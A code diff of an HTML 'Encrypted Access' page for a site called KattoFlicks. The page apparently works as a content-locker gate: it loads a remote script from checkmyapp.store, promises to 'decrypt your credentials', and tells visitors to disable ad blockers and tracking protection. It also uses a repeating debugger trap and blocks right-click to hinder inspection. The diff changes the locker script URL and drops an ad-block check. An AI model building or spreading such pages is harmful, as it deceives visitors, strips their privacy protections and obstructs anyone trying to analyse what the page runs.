@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Encrypted Access | KattoFlicks</title>
-    <script type="text/javascript" src="https://checkmyapp.store/cl/i/1x3x3x"></script>
+    <script type="text/javascript" src="https://checkmyapp.store/cl/js/joq3y"></script>
     <style>
         :root { --accent: #00ff88; --bg: #0a0b0d; --card: #14161a; --border: #23262d; --danger: #ff003c; }
         body { background: var(--bg); color: #e1e1e1; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; overflow: hidden; }
@@ -30,8 +30,6 @@
     </style>
 </head>
 <body>
-
-    <div id="ads-check-node" class="adsense-ads" style="position:absolute; left:-999px;">&nbsp;</div>
 
     <div id="lockdown-ui">
         <div class="warning-icon">⚠️</div>
@@ -98,13 +96,6 @@
                 return;
             }
 
-            const adsNode = document.getElementById('ads-check-node');
-            if (!adsNode || adsNode.offsetParent === null) {
-                document.getElementById('restrict-ui').style.display = 'block';
-                document.getElementById('restrict-msg').innerText = "Ad-Blocker detected. Please disable it to decrypt your credentials.";
-                return;
-            }
-
             setInterval(() => { debugger; }, 1000);
             document.addEventListener('contextmenu', e => e.preventDefault());
 
@@ -148,7 +139,7 @@
                 if (typeof og_load === "function") {
                     og_load();
                 } else {
-                    alert("Verification system is loading. Please disable adblockers.");
+                    alert("Verification system is loading. Please disable any tracking protection or adblockers.");
                     return;
                 }
 
